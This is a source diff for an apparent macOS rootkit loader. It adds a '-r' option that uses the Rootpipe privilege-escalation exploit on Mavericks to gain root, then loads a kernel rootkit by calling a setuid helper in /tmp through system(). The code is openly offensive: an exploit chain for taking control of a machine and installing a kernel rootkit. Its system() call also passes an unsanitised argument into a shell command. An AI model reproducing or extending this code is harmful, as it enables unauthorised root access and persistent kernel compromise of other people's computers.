@@ -75,6 +75,7 @@
 #include "kernel_code_exec.h"
 #include "trustedbsd.h"
 #include "exploit.h"
+#include "rootpipe_exploit.h"
 
 void
 header(void)
@@ -96,7 +97,8 @@ help(const char *name)
     printf("\n---[ Usage: ]---\n"
            "%s path_to_rootkit_binary [-x]\n\n"
            "Where path is location of the kext binary to load or remote http/https URI.\n"
-           "-x to use Google exploit for privilege escalation, only supported in Mavericks 10.9.5\n", name);
+           "-x to use Google exploit for privilege escalation, only supported in Mavericks 10.9.5\n"
+           "-r to use Rootpipe exploit for privilege escalation, only supported for Mavericks\n", name);
 }
 
 int
@@ -117,7 +119,7 @@ main(int argc, const char * argv[])
     }
     
     /* must be run as root */
-    if (argc == 2 && getuid() != 0)
+    if (argc == 2 && geteuid() != 0)
     {
         ERROR_MSG("Please run me as root!");
         return EXIT_FAILURE;
@@ -148,6 +150,31 @@ main(int argc, const char * argv[])
     if (argc == 3 && strcmp(argv[2], "-x") == 0)
     {
         get_me_r00t(kernel_buf, &kinfo, argv);
+    }
+    /* just a quick hack around rootpipe exploit */
+    /* not exactly fine code, just in a rush :PPP */
+    else if (argc == 3 && strcmp(argv[2], "-r") == 0)
+    {
+        printf("Executing rootpiped diagnostic service...\n");
+        get_me_rootpipe(argv[0]);
+        sleep(1);
+        int rootpipe_fd = open("/tmp/suid_diagnostic_service", O_RDONLY);
+        if (rootpipe_fd < 0)
+        {
+            ERROR_MSG("Can't open suid binary.");
+            return EXIT_FAILURE;
+        }
+        close(rootpipe_fd);
+        rootpipe_fd = open(argv[1], O_RDONLY);
+        if (rootpipe_fd < 0)
+        {
+            ERROR_MSG("Can't find rootkit binary.");
+            return EXIT_FAILURE;
+        }
+        char piped[MAXPATHLEN+1] = {0};
+        snprintf(piped, sizeof(piped), "/tmp/suid_diagnostic_service %s", argv[1]);
+        system(piped);
+        exit(0);
     }
 
     /* retrieve kaslr slide */
